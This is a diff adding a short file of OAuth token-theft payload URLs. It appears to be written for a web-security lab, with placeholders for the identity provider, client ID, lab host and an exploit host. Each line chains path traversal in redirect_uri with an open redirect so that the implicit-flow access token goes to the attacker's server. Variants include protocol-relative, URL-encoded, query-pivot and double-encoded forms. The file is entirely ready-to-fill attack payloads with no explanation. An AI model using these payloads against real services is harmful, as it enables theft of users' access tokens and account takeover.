@@ -1,0 +1,16 @@
+# Replace placeholders: {IDP_HOST} {CLIENT_ID} {LAB_HOST} {EXPLOIT_HOST} {RAND}
+
+# Basic chain (implicit flow)
+https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https://{LAB_HOST}/oauth-callback/../post/next?path=https://{EXPLOIT_HOST}/exploit&response_type=token&nonce={RAND}&scope=openid%20profile%20email
+
+# Using protocol-relative open redirect
+https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https://{LAB_HOST}/oauth-callback/../post/next?path=//{EXPLOIT_HOST}/exploit&response_type=token&nonce={RAND}&scope=openid%20profile%20email
+
+# URL-encoded redirect_uri param
+https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{LAB_HOST}%2Foauth-callback%2F..%2Fpost%2Fnext%3Fpath%3Dhttps%3A%2F%2F{EXPLOIT_HOST}%2Fexploit&response_type=token&nonce={RAND}&scope=openid%20profile%20email
+
+# Callback with query pivot (if applicable)
+https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https://{LAB_HOST}/oauth-callback?next=/post/next?path=https://{EXPLOIT_HOST}/exploit&response_type=token&nonce={RAND}&scope=openid%20profile%20email
+
+# Double-encoded traversal (if normalization is weak)
+https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https://{LAB_HOST}/oauth-callback/..%252f/post/next?path=https://{EXPLOIT_HOST}/exploit&response_type=token&nonce={RAND}&scope=openid%20profile%20email
